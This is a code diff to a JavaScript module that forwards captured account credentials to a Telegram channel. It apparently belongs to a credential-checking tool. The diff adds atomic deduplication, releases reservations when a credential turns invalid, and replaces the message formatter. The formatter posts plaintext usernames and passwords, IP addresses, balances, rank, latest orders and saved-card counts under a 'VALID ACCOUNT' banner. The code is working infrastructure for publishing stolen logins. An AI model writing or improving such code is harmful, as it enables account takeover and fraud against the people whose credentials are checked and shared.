@@ -14,7 +14,9 @@
 
 const crypto = require('crypto');
 const { createLogger } = require('../../logger');
-const { hasBeenForwarded, markForwarded } = require('../../telegram/channelForwardStore');
+const { reserveForwarded, releaseForwarded } = require('../../telegram/channelForwardStore');
+const { buildCheckAndCaptureResult } = require('../../telegram/messages');
+const { codeV2 } = require('../../telegram/messages/helpers');
 
 const log = createLogger('channel-forwarder');
 
@@ -146,23 +148,19 @@ class ChannelForwarder {
       ipAddress
     });
 
-    // Skip if already forwarded (prevents re-sends when .chk is run later)
-    try {
-      const alreadyForwarded = await hasBeenForwarded(username, password);
-      if (alreadyForwarded) {
-        log.debug('Skipping forward - already sent to channel', {
-          username: username.substring(0, 5) + '***'
-        });
-        return;
-      }
-    } catch (error) {
-      log.warn('Forward dedupe check failed, continuing cautiously', { error: error.message });
-    }
-
     // Validate capture data meets forwarding requirements
     const validation = this.validateCaptureData(capture);
     if (!validation.valid) {
       log.debug(`Skipping forward: ${validation.reason}`, {
+        username: username.substring(0, 5) + '***'
+      });
+      return;
+    }
+
+    // Atomically reserve a forward slot to prevent duplicate channel posts
+    const reserved = await reserveForwarded(username, password);
+    if (!reserved) {
+      log.debug('Skipping forward - already sent to channel', {
         username: username.substring(0, 5) + '***'
       });
       return;
@@ -228,16 +226,6 @@ class ChannelForwarder {
       // Phase 5: DEL forward:pending:{trackingCode}
       await this.redis.executeCommand('del', `forward:pending:${trackingCode}`);
 
-      // Mark forwarded in shared dedupe store so single .chk won’t resend
-      try {
-        await markForwarded(username, password);
-      } catch (error) {
-        log.warn('Failed to mark forwarded in dedupe store', {
-          username: username.substring(0, 5) + '***',
-          error: error.message
-        });
-      }
-
       log.info('Two-phase commit completed successfully', {
         username: username.substring(0, 5) + '***',
         trackingCode,
@@ -259,6 +247,15 @@ class ChannelForwarder {
         log.warn('Failed to clean up pending state', { 
           trackingCode, 
           cleanupError: cleanupError.message 
+        });
+      }
+
+      try {
+        await releaseForwarded(username, password);
+      } catch (releaseError) {
+        log.warn('Failed to release forward reservation after error', {
+          username: username.substring(0, 5) + '***',
+          error: releaseError.message
         });
       }
     }
@@ -287,7 +284,7 @@ class ChannelForwarder {
 
     try {
       // Query reverse lookup: GET msg:cred:{username}:{password}
-      const trackingCode = await this.redis.executeCommand('get', `msg:cred:${username}:${password}`);
+      const trackingCode = event.trackingCode || await this.redis.executeCommand('get', `msg:cred:${username}:${password}`);
       
       if (!trackingCode) {
         log.debug('No tracking code found for credential', {
@@ -335,6 +332,16 @@ class ChannelForwarder {
         // Clean up Redis references
         await this.redis.executeCommand('del', `msg:${trackingCode}`);
         await this.redis.executeCommand('del', `msg:cred:${username}:${password}`);
+
+        // Allow future forwards if the credential becomes valid again
+        try {
+          await releaseForwarded(username, password);
+        } catch (releaseError) {
+          log.warn('Failed to release dedupe after INVALID status', {
+            username: username.substring(0, 5) + '***',
+            error: releaseError.message
+          });
+        }
 
         log.info('Handled INVALID status update - message deleted', {
           username: username.substring(0, 5) + '***',
@@ -428,61 +435,9 @@ class ChannelForwarder {
    * Format message for Telegram channel
    */
   formatChannelMessage(username, password, capture, ipAddress, trackingCode) {
-    const escapeV2 = (text) => {
-      return text.replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
-    };
-    
-    const codeV2 = (text) => {
-      return `\`${text.replace(/[`\\]/g, '\\$&')}\``;
-    };
-    
-    const boldV2 = (text) => {
-      return `*${text.replace(/[*\\]/g, '\\$&')}*`;
-    };
-
-    const parts = [
-      `✅ ${boldV2('VALID ACCOUNT')}`,
-      '',
-      `${boldV2('🔐 Credentials')}`,
-      `└ User: ${codeV2(username)}`,
-      `└ Pass: ${codeV2(password)}`,
-      ''
-    ];
-
-    if (capture) {
-      parts.push(`${boldV2('📊 Account Info')}`);
-      
-      if (capture.points !== undefined) {
-        parts.push(`└ Points: ${escapeV2(capture.points.toString())}`);
-      }
-      
-      if (capture.cash !== undefined) {
-        parts.push(`└ Cash: ${escapeV2(capture.cash.toString())}`);
-      }
-      
-      if (capture.rank) {
-        parts.push(`└ Rank: ${escapeV2(capture.rank)}`);
-      }
-      
-      if (capture.latestOrder && capture.latestOrder !== 'n/a') {
-        parts.push(`└ Latest Order: ${escapeV2(capture.latestOrder)}`);
-      }
-      
-      if (capture.profile && capture.profile.cards && capture.profile.cards.length > 0) {
-        parts.push(`└ Cards: ${capture.profile.cards.length}`);
-      }
-      
-      parts.push('');
-    }
-
-    if (ipAddress) {
-      parts.push(`🌐 IP Address: ${codeV2(ipAddress)}`);
-      parts.push('');
-    }
-
-    parts.push(`📎 ${codeV2(trackingCode)}`);
-
-    return parts.join('\n');
+    const result = { status: 'VALID' };
+    const baseMessage = buildCheckAndCaptureResult(result, capture, username, null, password, ipAddress);
+    return `${baseMessage}\n\n📎 ${codeV2(trackingCode)}`;
   }
 
   /**
